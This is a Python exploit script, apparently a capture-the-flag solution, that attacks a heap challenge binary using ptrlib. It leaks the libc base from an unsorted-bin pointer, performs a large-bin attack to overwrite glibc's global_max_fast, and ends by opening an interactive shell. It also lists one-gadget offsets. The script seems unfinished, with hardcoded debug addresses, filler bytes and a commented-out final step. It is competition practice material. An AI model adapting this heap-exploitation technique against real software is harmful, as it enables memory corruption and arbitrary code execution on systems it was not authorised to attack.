#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")

one_gadgets = [0xEBCF1, 0xEBCF5, 0xEBCF8, 0xEBD52, 0xEBDA8, 0xEBDAF, 0xEBDB3]
ptr.logger.setLevel("DEBUG")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def create(io, index, size):
    size_ = 0
    if size > 0x600:
        ptr.logger.error("size too big")
        exit(1)
    if size < 0x500:
        ptr.logger.warn("size has been fixed to 0x500")
        size_ = 0x500
    else:
        size_ = size

    ptr.logger.debug("> 1")
    io.sendlineafter("> ", "1")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index).encode())
    ptr.logger.debug(f"size: {size_}")
    io.sendlineafter("size: ", str(size_).encode())
    ptr.logger.debug(f"finished!")


def write(io, index, data):
    ptr.logger.info(f"writing {index} with data {data}")
    ptr.logger.debug("> 2")
    io.sendlineafter("> ", "2")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index))
    ptr.logger.debug(f"data: {data}")
    io.sendlineafter("data: ", data)
    ptr.logger.debug("finished!")


def read(io, index, size):
    ptr.logger.info(f"reading {index} with size {size}")
    ptr.logger.debug("> 3")
    io.sendlineafter("> ", "3")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index))
    ptr.logger.debug('receiving "papyrus: "')
    io.recvuntil("papyrus: ")
    ptr.logger.debug(f"receiving data (size: {size})")
    data = io.recv(size)
    ptr.logger.debug("finished")
    return data


def delete(io, index):
    ptr.logger.info(f"deleting {index}")
    ptr.logger.debug("> 4")
    io.sendlineafter("> ", "4")
    ptr.logger.debug(f"index: {index}")
    io.sendlineafter("index: ", str(index))
    ptr.logger.debug("finished!")


def main():
    io = connect()

    #
    # leak libc
    #
    create(io, 0, 0)
    create(io, 1, 0)  # prevent consolidation
    delete(io, 0)
    libc.base = ptr.u64(read(io, 0, 6)) - 0x60 - unwrap(libc.symbol("main_arena"))

    # clear chunks
    delete(io, 1)

    #
    # overwrite global_max_fast to very large value (from 0x80)
    #
    create(io, 0, 0x528)
    create(io, 1, 0x500)  # prevent consolidation
    create(io, 2, 0x518)
    create(io, 3, 0x500)  # prevent consolidation
    # 0: p1
    # 2: p2
    # p1 > p2
    delete(io, 0)  # p1[0] to unsorted bin
    create(io, 1, 0x538)  # p1[0] to large bin
    delete(io, 2)  # p2[2] to unsorted bin

    payload = ptr.p64(0x000055555555BCD0)
    payload += ptr.p64(0x00007FFFF7E1A110)
    payload += ptr.p64(0x000055555555BCD0)
    payload += ptr.p64(unwrap(libc.symbol("global_max_fast")) - 0x20)
    payload += b"HELLO"
    write(io, 0, payload)

    print(hex(unwrap(libc.symbol("_rtld_global"))))

    create(io, 3, 0x538)  # p2[2] to large bin
    delete(io, 3)
    delete(io, 1)
    # write(io, 3, ptr.p64(unwrap(libc.symbol("__printf_function_table"))))
    # fastbin [3]
    # largebin [2] -> [0]

    io.sh()


if __name__ == "__main__":
    main()
